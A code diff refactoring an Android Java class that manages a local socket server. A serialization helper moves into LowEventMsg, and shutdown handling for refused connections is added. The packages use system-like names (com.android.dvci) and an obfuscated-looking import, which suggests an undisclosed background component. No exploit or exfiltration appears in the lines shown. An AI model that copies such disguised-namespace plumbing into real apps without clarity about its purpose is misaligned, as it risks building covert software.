@@ -7,6 +7,7 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.LowEventMsg;
 import com.android.dvci.util.Utils;
+import com.android.mm.M;
 
 import java.io.BufferedInputStream;
 import java.io.BufferedOutputStream;
@@ -48,6 +49,7 @@ public class LowEventHandlerManager extends Listener<LowEventMsg> implements Run
 
 	private static final String TAG = "LowEventHandler";
 	private static final int DEFAULT_STOP_TIMEOUT = 60;
+
 	private boolean accept =true;
 	private LocalServerSocket server = null;
 	private Thread thread = null;
@@ -83,6 +85,7 @@ public class LowEventHandlerManager extends Listener<LowEventMsg> implements Run
 		if(thread == null) {
 			thread = new Thread(this);
 		}
+		accept = true;
 		thread.start();
 	}
 
@@ -92,97 +95,6 @@ public class LowEventHandlerManager extends Listener<LowEventMsg> implements Run
 	}
 
 
-	private static LowEventMsg sendSerialObj(LowEventMsg obj) {
-		if (obj==null){
-			return null;
-		}
-		LocalSocket sender = new LocalSocket();
-		obj.res=1;
-		try {
-			sender.connect(new LocalSocketAddress("llad"));
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(sendSerialObj): SENT DATA ");
-			}
-			int timeout = 5;
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(sendSerialObj): wait connection..");
-			}
-			while (timeout-- > 0) {
-				if (sender.isBound() && sender.isConnected()) {
-					break;
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + ".");
-					}
-				}
-				Utils.sleep(100);
-			}
-			if (!(sender.isBound() && sender.isConnected())) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(sendSerialObj):  (connection failed): ");//$NON-NLS-1$
-				}
-				return obj;
-			}
-			DataInputStream streamIn = new DataInputStream(new
-					BufferedInputStream(sender.getInputStream()));
-			DataOutputStream streamOut = new DataOutputStream(new
-					BufferedOutputStream(sender.getOutputStream()));
-			ObjectOutputStream oos = new ObjectOutputStream(streamOut);
-			oos.writeObject(obj);
-			oos.flush();
-			streamOut.flush();
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(sendSerialObj): object sent");//$NON-NLS-1$
-			}
-			obj = null;
-			timeout = 10;
-			int available = 0;
-			while (timeout-- > 0 && available <= 0) {
-				try {
-					if (sender.isBound() && sender.isConnected()) {
-						try {
-							available = streamIn.available();
-							if (Cfg.DEBUG) {
-								Check.log(TAG + "(sendSerialObj): getAvailable " + available);//$NON-NLS-1$
-							}
-							if (available > 0) {
-
-								ObjectInputStream ois = new ObjectInputStream(streamIn);
-								obj = (LowEventMsg) ois.readObject();
-								if (Cfg.DEBUG) {
-									Check.log(TAG + "(sendSerialObj): GOT DATA " + obj);
-								}
-							}
-						} catch (Exception e) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + "(sendSerialObj): is available Error: ", e);//$NON-NLS-1$
-							}
-						}
-					} else {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(sendSerialObj):  getAvailable sender not connected");//$NON-NLS-1$
-						}
-
-					}
-
-				} catch (Exception e) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(sendSerialObj): getAvailable Error: ", e);//$NON-NLS-1$
-					}
-				}
-				Utils.sleep(100);
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (sendSerialObj): exiting t=" + timeout + " a=" + available);//$NON-NLS-1$
-			}
-			Utils.sleep(100);
-		}catch (Exception e){
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(sendSerialObj): LocalSocketAddress Error: ", e);//$NON-NLS-1$
-			}
-		}
-		return obj;
-	}
 
 	/**
 	 * Stops the listening socket if any
@@ -203,9 +115,15 @@ public class LowEventHandlerManager extends Listener<LowEventMsg> implements Run
 			obj.type = LowEventMsg.EVENT_TYPE_KILL;
 			Date start = new Date();
 			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
-			while (server != null && diff_sec < timeout_seconds ) {
+			while (server != null && diff_sec < timeout_seconds && thread != null ) {
 				thread.interrupt();
 				Utils.sleep(100);
+				if ( obj == null ){
+					obj = new LowEventMsg();
+					obj.data = null;
+					obj.type = LowEventMsg.EVENT_TYPE_KILL;
+				}
+				obj = LowEventMsg.sendSerialObj(obj,"closeSocketServer");
 				if (server != null) {
 					try {
 						server.close();
@@ -214,12 +132,16 @@ public class LowEventHandlerManager extends Listener<LowEventMsg> implements Run
 						continue;
 					}
 				}
-				if ( obj == null ){
-					obj = new LowEventMsg();
-					obj.data = null;
-					obj.type = LowEventMsg.EVENT_TYPE_KILL;
+				switch (obj.res){
+					case LowEventMsg.CONNECTION_REFUSED:
+					{
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (closeSocketServer): CONNECTION REFUSED server should be closed");
+						}
+						return;
+					}
 				}
-				obj = sendSerialObj(obj);
+
 				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
 			}
 		}
